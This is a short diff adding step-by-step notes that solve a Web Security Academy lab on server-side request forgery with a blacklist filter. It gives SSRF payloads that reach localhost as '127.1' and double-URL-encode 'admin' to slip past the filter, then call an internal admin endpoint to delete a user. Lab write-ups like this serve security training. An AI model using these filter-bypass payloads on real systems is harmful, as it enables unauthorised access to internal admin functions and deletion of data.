@@ -1,0 +1,8 @@
+Lab #03: SSRF with blacklist-based input filter
+
+1. use 127.1 to access the stock page and use double url encode for a in admin.
+stockApi=http://127.1/%2561dmin
+2. Copy the link for deleting the carlos user
+https://0aa00086037db6498023f33800b9008c.web-security-academy.net/admin/delete?username=carlos
+3. Make the request
+stockApi=http://127.1/%2561dmin/delete?username=carlos
